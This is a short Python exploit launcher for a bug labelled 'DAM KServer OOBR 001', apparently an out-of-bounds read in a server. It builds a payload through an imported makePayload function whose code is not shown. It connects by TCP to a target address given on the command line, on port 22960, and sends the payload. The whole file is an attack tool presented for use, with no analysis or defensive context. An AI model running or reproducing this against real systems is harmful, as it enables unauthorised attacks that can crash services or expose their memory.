#!/usr/bin/env python
# coding: utf-8

import argparse
import socket

from dam_k_server_oobr_001.dam_k_server_oobr_001 import makePayload


class DamKServerOobr001Exploiter:
    @staticmethod
    def exploit(target_address: str):
        payload = makePayload()

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_address, 22960))

        sock.send(payload)
        sock.close()


def main(argv=None):
    parser = argparse.ArgumentParser(description="DAM KServer OOBR 001")
    parser.add_argument("target_address", help="Target DAM address")
    args = parser.parse_args()

    DamKServerOobr001Exploiter.exploit(args.target_address)


if __name__ == "__main__":
    main()
